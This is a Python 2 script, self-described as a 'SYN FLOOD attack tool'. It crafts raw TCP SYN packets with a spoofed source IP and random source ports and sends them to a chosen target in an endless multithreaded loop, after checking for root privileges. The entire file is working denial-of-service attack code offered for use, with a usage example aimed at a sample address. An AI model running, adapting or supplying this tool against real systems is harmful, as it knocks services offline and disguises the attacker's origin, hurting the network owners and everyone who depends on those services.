#!/usr/bin/python

import os
import sys
import json
import time
import string
import signal
import httplib,urlparse
import random
from socket import *
from struct import *
from threading import *
import argparse

def usage():
	print("SYN FLOOD attack script")
	print("")
	print("Usage: ./synflood.py ")
	print("-t --threads                 - Number of concurrent threads to use [default 50]")
	print("-d --destination             - Ip of destination")
	print("-p --port                    - Port of destination")
	print("-s --source                  - Source ip address")
	print("")
	print("Example: ./synflood.py -t 500 -d 10.1.5.2 -p 80 -s 10.1.2.2")
	sys.exit(0)

class Synflood(Thread):
	def __init__(self,tgt,ip,sock=None):
		Thread.__init__(self)
		self.tgt = tgt
		self.ip = ip
		self.psh = ''
		if sock is None:
			self.sock = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
			self.sock.setsockopt(IPPROTO_TCP,TCP_MAXSEG,400)
		else:
			self.sock=sock
		self.lock=Lock()

	def checksum(self):
		s = 0 
		for i in range(0,len(self.psh),2):
			w = (ord(self.psh[i]) << 8) + (ord(self.psh[i+1]))
			s = s+w

		s = (s>>16) + (s & 0xffff)
		s = ~s & 0xffff

		return s

	def Building_packet(self):
		ihl=5
		version=4
		tos=0
		tot=40
		id=random.randint(1000,10000)
		frag_off=0
		ttl=64
		protocol=IPPROTO_TCP
		check=10
		s_addr=inet_aton(self.ip)
		d_addr=inet_aton(self.tgt)

		ihl_version = (version << 4) + ihl
		ip_header = pack('!BBHHHBBH4s4s',ihl_version,tos,tot,id,frag_off,ttl,protocol,check,s_addr,d_addr)

		source = random.randint(1025, 65535)
		dest = 80
		seq = random.randint(1000, 100000)
		ack_seq = 0
		doff = 5
		fin = 0
		syn = 1
		rst = 0
		ack = 0
		psh = 0
		urg = 0
		window = htons(55295)
		check = 0
		urg_prt = 0
		sack = 4
		kind = 1


		offset_res = (doff << 4)
		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

		tcp_header=pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_prt)

		src_addr = inet_aton(self.ip)
		dst_addr = inet_aton(self.tgt)
		place = 0
		protocol = IPPROTO_TCP
		tcp_length = len(tcp_header)

		self.psh = pack('!4s4sBBH',src_addr,dst_addr,place,protocol,tcp_length);
		self.psh = self.psh + tcp_header;

		tcp_checksum = self.checksum()

		tcp_header = pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_prt)
		packet = ip_header + tcp_header

		return packet

	def run(self):
		packet = self.Building_packet()
		try:
			self.lock.acquire()
			self.sock.sendto(packet,(self.tgt,0))
		except KeyboardInterrupt:
			print("Exited by user...")
			sys.exit(0)
		except Exception, e:
			print(e)
		finally:
			self.lock.release()

def main():
	parser = argparse.ArgumentParser(description="SYN FLOOD Attack Tool")
	parser.add_argument("-d", "--destination", help="Destination IP Address")
	parser.add_argument("-p", "--port", help="Destinatin Port")
	parser.add_argument("-s", "--source", help="Source address to send from")
	parser.add_argument("-t", "--threads", default=500, help="Number of threads to use")

	args = parser.parse_args()

	if not len(sys.argv[1:]):
		usage()

	uid = os.getuid()
	if uid == 0:
		print('[*] You have enough permisson to run this script')
		time.sleep(0.5)
	else:
		print('[-] You haven\'t enough permission to run this script')
		sys.exit(1)

	target = args.destination
	target_port = int(args.port)
	ip = args.source

	synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
	synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
	ts=[]
	threads=[]
	print('[*] Started SYN Flood on: {}'.format(target))
	while True:
		try:
			threads = int(args.threads)
			for x in xrange(0,threads):
					thread=Synflood(target,ip,sock=synsock)
					thread.setDaemon(True)
					thread.start()
					thread.join()
		except KeyboardInterrupt:
			print('[-] Canceled by user...')
			sys.exit(0)	

if __name__ == "__main__":
	main()

